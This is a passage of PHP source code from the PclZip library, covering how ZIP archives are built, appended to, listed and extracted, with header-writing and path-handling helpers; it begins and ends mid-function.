          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_NEW_FULL_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_full_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_COMMENT :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['comment'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_MTIME :
        if (!is_integer($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['mtime'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_CONTENT :
        $p_filedescr['content'] = $v_value;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                           "Unknown parameter '".$v_key."'");

        return PclZip::errorCode();
    }

    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        if ($v_requested_options[$key] == 'mandatory') {
          if (!isset($p_file_list[$key])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
            return PclZip::errorCode();
          }
        }
      }
    }
  
  }
  
  return $v_result;
}

function privFileDescrExpand(&$p_filedescr_list, &$p_options)
{
  $v_result=1;
  
  $v_result_list = array();
  
  for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
    
    $v_descr = $p_filedescr_list[$i];
    
    $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename'], false);
    $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
    
    if (file_exists($v_descr['filename'])) {
      if (@is_file($v_descr['filename'])) {
        $v_descr['type'] = 'file';
      }
      else if (@is_dir($v_descr['filename'])) {
        $v_descr['type'] = 'folder';
      }
      else if (@is_link($v_descr['filename'])) {
        continue;
      }
      else {
        continue;
      }
    }
    
    else if (isset($v_descr['content'])) {
      $v_descr['type'] = 'virtual_file';
    }
    
    else {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exist");

      return PclZip::errorCode();
    }
    
    $this->privCalculateStoredFilename($v_descr, $p_options);
    
    $v_result_list[sizeof($v_result_list)] = $v_descr;
    
    if ($v_descr['type'] == 'folder') {
      $v_dirlist_descr = array();
      $v_dirlist_nb = 0;
      if ($v_folder_handler = @opendir($v_descr['filename'])) {
        while (($v_item_handler = @readdir($v_folder_handler)) !== false) {

          if (($v_item_handler == '.') || ($v_item_handler == '..')) {
              continue;
          }
          
          $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
          
          if (($v_descr['stored_filename'] != $v_descr['filename'])
               && (!isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))) {
            if ($v_descr['stored_filename'] != '') {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
            }
            else {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
            }
          }
    
          $v_dirlist_nb++;
        }
        
        @closedir($v_folder_handler);
      }
      else {
      }
      
      if ($v_dirlist_nb != 0) {
        if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) {
          return $v_result;
        }
        
        $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
      }
      else {
      }
        
      unset($v_dirlist_descr);
    }
  }
  
  $p_filedescr_list = $v_result_list;

  return $v_result;
}

function privCreate($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();
  
  $this->privDisableMagicQuotes();

  if (($v_result = $this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privAdd($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0))
  {

    $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);

    return $v_result;
  }
  $this->privDisableMagicQuotes();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    fclose($v_zip_temp_fd);
    $this->privCloseFd();
    @unlink($v_zip_temp_name);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        fclose($v_zip_temp_fd);
        $this->privCloseFd();
        @unlink($v_zip_temp_name);
        $this->privSwapBackMagicQuotes();

        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = $v_central_dir['comment'];
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) {
    $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  $this->privSwapBackMagicQuotes();

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privOpenFd($p_mode)
{
  $v_result=1;

  if ($this->zip_fd != 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');

    return PclZip::errorCode();
  }

  if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');

    return PclZip::errorCode();
  }

  return $v_result;
}

function privCloseFd()
{
  $v_result=1;

  if ($this->zip_fd != 0)
    @fclose($this->zip_fd);
  $this->zip_fd = 0;

  return $v_result;
}

function privAddList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = '';
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);

    return $v_result;
  }

  return $v_result;
}

function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_header = array();

  $v_nb = sizeof($p_result_list);

  for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
    $p_filedescr_list[$j]['filename']
    = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
    

    if ($p_filedescr_list[$j]['filename'] == "") {
      continue;
    }

    if (   ($p_filedescr_list[$j]['type'] != 'virtual_file')
        && (!file_exists($p_filedescr_list[$j]['filename']))) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exist");
      return PclZip::errorCode();
    }

    if (   ($p_filedescr_list[$j]['type'] == 'file')
        || ($p_filedescr_list[$j]['type'] == 'virtual_file')
        || (   ($p_filedescr_list[$j]['type'] == 'folder')
            && (   !isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])
                || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))
        ) {

      $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,
                                     $p_options);
      if ($v_result != 1) {
        return $v_result;
      }

      $p_result_list[$v_nb++] = $v_header;
    }
  }

  return $v_result;
}

function privAddFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];

  if ($p_filename == "") {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");

    return PclZip::errorCode();
  }


  clearstatcache();
  $p_header['version'] = 20;
  $p_header['version_extracted'] = 10;
  $p_header['flag'] = 0;
  $p_header['compression'] = 0;
  $p_header['crc'] = 0;
  $p_header['compressed_size'] = 0;
  $p_header['filename_len'] = strlen($p_filename);
  $p_header['extra_len'] = 0;
  $p_header['disk'] = 0;
  $p_header['internal'] = 0;
  $p_header['offset'] = 0;
  $p_header['filename'] = $p_filename;
  $p_header['stored_filename'] = $p_filedescr['stored_filename'];
  $p_header['extra'] = '';
  $p_header['status'] = 'ok';
  $p_header['index'] = -1;

  if ($p_filedescr['type']=='file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type']=='folder') {
    $p_header['external'] = 0x00000010;
    $p_header['mtime'] = filemtime($p_filename);
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = strlen($p_filedescr['content']);
  }
  

  if (isset($p_filedescr['mtime'])) {
    $p_header['mtime'] = $p_filedescr['mtime'];
  }
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['mtime'] = time();
  }
  else {
    $p_header['mtime'] = filemtime($p_filename);
  }

  if (isset($p_filedescr['comment'])) {
    $p_header['comment_len'] = strlen($p_filedescr['comment']);
    $p_header['comment'] = $p_filedescr['comment'];
  }
  else {
    $p_header['comment_len'] = 0;
    $p_header['comment'] = '';
  }

  if (isset($p_options[PCLZIP_CB_PRE_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_ADD](PCLZIP_CB_PRE_ADD, $v_local_header);
    if ($v_result == 0) {
      $p_header['status'] = "skipped";
      $v_result = 1;
    }

    if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
      $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
    }
  }

  if ($p_header['stored_filename'] == "") {
    $p_header['status'] = "filtered";
  }
  
  if (strlen($p_header['stored_filename']) > 0xFF) {
    $p_header['status'] = 'filename_too_long';
  }

  if ($p_header['status'] == 'ok') {

    if ($p_filedescr['type'] == 'file') {
      if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
          && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
              || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                  && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_header['size'])) ) ) {
        $v_result = $this->privAddFileUsingTempFile($p_filedescr, $p_header, $p_options);
        if ($v_result < PCLZIP_ERR_NO_ERROR) {
          return $v_result;
        }
      }
      
      else {

      if (($v_file = @fopen($p_filename, "rb")) == 0) {
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
        return PclZip::errorCode();
      }

      $v_content = @fread($v_file, $p_header['size']);

      @fclose($v_file);

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);

      }

    }

    else if ($p_filedescr['type'] == 'virtual_file') {
        
      $v_content = $p_filedescr['content'];

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
    }

    else if ($p_filedescr['type'] == 'folder') {
      if (@substr($p_header['stored_filename'], -1) != '/') {
        $p_header['stored_filename'] .= '/';
      }

      $p_header['size'] = 0;

      if (($v_result = $this->privWriteFileHeader($p_header)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (isset($p_options[PCLZIP_CB_POST_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_ADD](PCLZIP_CB_POST_ADD, $v_local_header);
    if ($v_result == 0) {
      $v_result = 1;
    }

  }

  return $v_result;
}

function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=PCLZIP_ERR_NO_ERROR;
  
  $p_filename = $p_filedescr['filename'];


  if (($v_file = @fopen($p_filename, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
    return PclZip::errorCode();
  }

  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_file_compressed = @gzopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }

  $v_size = filesize($p_filename);
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file, $v_read_size);
    @gzputs($v_file_compressed, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file);
  @gzclose($v_file_compressed);

  if (filesize($v_gzip_temp_name) < 18) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'gzip temporary file \''.$v_gzip_temp_name.'\' has invalid filesize - should be minimum 18 bytes');
    return PclZip::errorCode();
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  $v_binary_data = @fread($v_file_compressed, 10);
  $v_data_header = unpack('a1id1/a1id2/a1cm/a1flag/Vmtime/a1xfl/a1os', $v_binary_data);

  $v_data_header['os'] = bin2hex($v_data_header['os']);

  @fseek($v_file_compressed, filesize($v_gzip_temp_name)-8);
  $v_binary_data = @fread($v_file_compressed, 8);
  $v_data_footer = unpack('Vcrc/Vcompressed_size', $v_binary_data);

  $p_header['compression'] = ord($v_data_header['cm']);
  $p_header['crc'] = $v_data_footer['crc'];
  $p_header['compressed_size'] = filesize($v_gzip_temp_name)-18;

  @fclose($v_file_compressed);

  if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
    return $v_result;
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  fseek($v_file_compressed, 10);
  $v_size = $p_header['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file_compressed, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file_compressed);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privCalculateStoredFilename(&$p_filedescr, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];
  if (isset($p_options[PCLZIP_OPT_ADD_PATH])) {
    $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];
  }
  else {
    $p_add_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) {
    $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];
  }
  else {
    $p_remove_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
    $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];
  }
  else {
    $p_remove_all_dir = 0;
  }


  if (isset($p_filedescr['new_full_name'])) {
    $v_stored_filename = PclZipUtilTranslateWinPath($p_filedescr['new_full_name']);
  }
  
  else {

    if (isset($p_filedescr['new_short_name'])) {
      $v_path_info = pathinfo($p_filename);
      $v_dir = '';
      if ($v_path_info['dirname'] != '') {
        $v_dir = $v_path_info['dirname'].'/';
      }
      $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
    }
    else {
      $v_stored_filename = $p_filename;
    }

    if ($p_remove_all_dir) {
      $v_stored_filename = basename($p_filename);
    }
    else if ($p_remove_dir != "") {
      if (substr($p_remove_dir, -1) != '/')
        $p_remove_dir .= "/";

      if (   (substr($p_filename, 0, 2) == "./")
          || (substr($p_remove_dir, 0, 2) == "./")) {
          
        if (   (substr($p_filename, 0, 2) == "./")
            && (substr($p_remove_dir, 0, 2) != "./")) {
          $p_remove_dir = "./".$p_remove_dir;
        }
        if (   (substr($p_filename, 0, 2) != "./")
            && (substr($p_remove_dir, 0, 2) == "./")) {
          $p_remove_dir = substr($p_remove_dir, 2);
        }
      }

      $v_compare = PclZipUtilPathInclusion($p_remove_dir,
                                           $v_stored_filename);
      if ($v_compare > 0) {
        if ($v_compare == 2) {
          $v_stored_filename = "";
        }
        else {
          $v_stored_filename = substr($v_stored_filename,
                                      strlen($p_remove_dir));
        }
      }
    }
    
    $v_stored_filename = PclZipUtilTranslateWinPath($v_stored_filename);
    
    if ($p_add_dir != "") {
      if (substr($p_add_dir, -1) == "/")
        $v_stored_filename = $p_add_dir.$v_stored_filename;
      else
        $v_stored_filename = $p_add_dir."/".$v_stored_filename;
    }
  }

  $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
  $p_filedescr['stored_filename'] = $v_stored_filename;
  
  return $v_result;
}

function privWriteFileHeader(&$p_header)
{
  $v_result=1;

  $p_header['offset'] = ftell($this->zip_fd);

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

  $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,
                      $p_header['version_extracted'], $p_header['flag'],
                        $p_header['compression'], $v_mtime, $v_mdate,
                        $p_header['crc'], $p_header['compressed_size'],
					  $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len']);

  fputs($this->zip_fd, $v_binary_data, 30);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }

  return $v_result;
}

function privWriteCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];


  $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,
                      $p_header['version'], $p_header['version_extracted'],
                        $p_header['flag'], $p_header['compression'],
					  $v_mtime, $v_mdate, $p_header['crc'],
                        $p_header['compressed_size'], $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len'], $p_header['comment_len'],
                        $p_header['disk'], $p_header['internal'],
					  $p_header['external'], $p_header['offset']);

  fputs($this->zip_fd, $v_binary_data, 46);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }
  if ($p_header['comment_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']);
  }

  return $v_result;
}

function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)
{
  $v_result=1;

  $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,
                      $p_nb_entries, $p_size,
					  $p_offset, strlen($p_comment));

  fputs($this->zip_fd, $v_binary_data, 22);

  if (strlen($p_comment) != 0)
  {
    fputs($this->zip_fd, $p_comment, strlen($p_comment));
  }

  return $v_result;
}

function privList(&$p_list)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
  {
    $this->privSwapBackMagicQuotes();
    
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

    return PclZip::errorCode();
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_central_dir['offset']))
  {
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  for ($i=0; $i<$v_central_dir['entries']; $i++)
  {
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_header['index'] = $i;

    $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
    unset($v_header);
  }

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privConvertHeader2FileInfo($p_header, &$p_info)
{
  $v_result=1;

  $v_temp_path = PclZipUtilPathReduction($p_header['filename']);
  $p_info['filename'] = $v_temp_path;
  $v_temp_path = PclZipUtilPathReduction($p_header['stored_filename']);
  $p_info['stored_filename'] = $v_temp_path;
  $p_info['size'] = $p_header['size'];
  $p_info['compressed_size'] = $p_header['compressed_size'];
  $p_info['mtime'] = $p_header['mtime'];
  $p_info['comment'] = $p_header['comment'];
  $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
  $p_info['index'] = $p_header['index'];
  $p_info['status'] = $p_header['status'];
  $p_info['crc'] = $p_header['crc'];

  return $v_result;
}

function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (   ($p_path == "")
    || (   (substr($p_path, 0, 1) != "/")
	    && (substr($p_path, 0, 3) != "../")
		&& (substr($p_path,1,2)!=":/")))
    $p_path = "./".$p_path;

  if (($p_path != "./") && ($p_path != "/"))
  {
    while (substr($p_path, -1) == "/")
    {
      $p_path = substr($p_path, 0, strlen($p_path)-1);
    }
  }

  if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/'))
  {
    $p_remove_path .= '/';
  }
  $p_remove_path_size = strlen($p_remove_path);

  if (($v_result = $this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_pos_entry = $v_central_dir['offset'];

  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    @rewind($this->zip_fd);
    if (@fseek($this->zip_fd, $v_pos_entry))
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      return PclZip::errorCode();
    }

    $v_header = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      return $v_result;
    }

    $v_header['index'] = $i;

    $v_pos_entry = ftell($this->zip_fd);

    $v_extract = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_extract = true;
                }
            }
            elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_extract = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
            $v_extract = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
        
        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_extract = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }

    else {
        $v_extract = true;
    }

  if (   ($v_extract)
      && (   ($v_header['compression'] != 8)
	      && ($v_header['compression'] != 0))) {
        $v_header['status'] = 'unsupported_compression';

